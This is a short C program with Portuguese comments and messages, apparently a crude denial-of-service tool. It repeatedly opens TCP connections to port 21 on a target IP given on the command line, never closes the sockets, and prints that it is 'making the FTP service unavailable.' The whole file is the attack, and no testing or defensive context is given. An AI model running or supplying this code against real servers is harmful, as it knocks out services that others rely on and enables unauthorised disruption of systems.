#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]){

    if (argc != 2) {
        printf("Uso: %s <endereco IP>\n", argv[0]);
        return 1;
    }

    int meusocket;
    int conecta;
    int porta;
    int inicio = 0;
    int final = 65535;
    char *destino = argv[1];

    struct sockaddr_in alvo;

    // Verifica se o endereço IP é válido
    if (inet_addr(destino) == INADDR_NONE) {
        printf("Endereço IP inexistente.\n");
        return 1;
    }

    for(porta=inicio; porta<final; porta++){

        meusocket = socket(AF_INET, SOCK_STREAM, 0);
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(21);
        alvo.sin_addr.s_addr = inet_addr(destino);

        conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

        if(conecta == 0){
            printf("Tornando serviço FTP indisponível! \n");
        }
    }

    return 0;
}
